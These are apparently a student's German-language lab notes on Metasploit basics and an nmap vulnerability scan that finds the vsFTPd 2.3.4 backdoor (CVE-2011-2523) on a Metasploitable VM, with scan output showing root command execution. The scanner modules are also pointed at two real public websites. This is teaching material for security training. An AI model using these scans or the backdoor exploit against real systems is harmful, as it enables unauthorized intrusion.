# 4AHITS ITSE G1 (19.01.2026) vsFTP Backdoor

In dieser Übung starten wir einen Angriff auf die matasploitable VM mit dem Tool metasploit.

Mittels der nmap Skripts konnten wir feststellen dass vsFTPd version 2.3.4 eine Sicherheitslücke enthält (backdoor).

In weiterer Folge nutzen wir ein exploit Modul von metasploit um diese Sicherheitslücke auszunutzen.

Metasploit ist ein Werkzeugkasten für Hacker und Penetration-Tester: damit kann man Schwachstellen suchen, Exploits ausprobieren, payloads (shell-code) bauen und nach einem erfolgreichen Einbruch weiterforschen (Meterpreter).

Gemeinsame Übung (Metasploit)
$ msfconsole

Beispiel: Die Module SSH Version und http Title.

SSH Version:

search -h --> zeigt eine allgemeine Hilfe an
search ssh --> markiert alle Ausgaben in denen ssh vorkommt
search scanner/ssh --> sucht nach ssh Scannern
search type:auxiliary name:ssh --> gibt alle Module aus mit ssh im Namen
info auxiliary/scanner/ssh/ssh_version --> Gibt infos zu dem Modul aus
use auxiliary/scanner/ssh/ssh_version --> nutzt das Modul
options --> gibt dir die Optionen an die zur Verfügung stehen
set RHOSTS <target IP> --> um sich mit dem Host zu verbinden
run --> Führt das Modul aus und gibt dir in diesem Fall die ssh Version aus

http Title:

use auxiliary/scanner/http/title --> Wählt Modul aus
info --> gibt Modul infos aus
options --> Zeigt dir verfügabre Optionen an
set RHOSTS <target IP> --> Setzt Ziel Host
run --> Zeigt Infos zu http an (heut zu tage keine Version mehr im Header enthalten)
set RHOSTS www.orf.at
run
set RHOSTS www.htl-braunau.at
run

## Übung (msf Basics)
Probiere alle besprochenen bzw. open beschriebenen msf Befehle noch einmal aus und erstelle ein kurzes Cheatsheet zur Bedienung von metasploit.

Der Befehl setg (set global) ist in unserem Zusammenhang auch sehr praktisch, recherchiere dazu.
Mit setg kann man die Einstellungen auf alle Module anwenden, wie zb. Host oder Port.
Recherchiere zu
**msfvenom**
Msfvenom erschafft eine Datei um sich remote auf einen anderen Rechner zu verbinden.
**Meterpreter**
Meterpreter nutzt dann diese Verbindung und kann Daten lesen.

## Übung (nmap FTP scan)
Aufgabe: Wiederhole den nmap vuln scan auf den FTP Port. Verwende:

Option --script=vuln (Diese Skripte sind “intrusive” und werden daher nicht über die Optionen -sC oder -A aufgerufen.)

Option -p zum Einschränken auf den FTP Port

```
┌──(kali㉿kali)-[~]
└─$ nmap --script=vuln -p 21 192.168.153.128

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-19 07:05 EST
Nmap scan report for 192.168.153.128
Host is up (0.0015s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|  vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|_      https://www.securityfocus.com/bid/48539
MAC Address: 00:0C:29:25:AA:6B (VMware)

Nmap done: 1 IP address (1 host up) scanned in 13.22 seconds
```
Findet nmap die Sicherheitslücke? Recherchiere mit Hilfe der CVE Nummer über diese Sicherheitslücke.
vsFTPd 2.3.4 Backdoor, CVE Nummer: CVE-2011-2523
Hier wurde absichtlich vom Entwickler eine Backdoor eingebaut
Recherchiere warum diese Skripte als intrusive bezeichnet werden, warum werden diese bei -sC oder -A nicht ausgeführt?
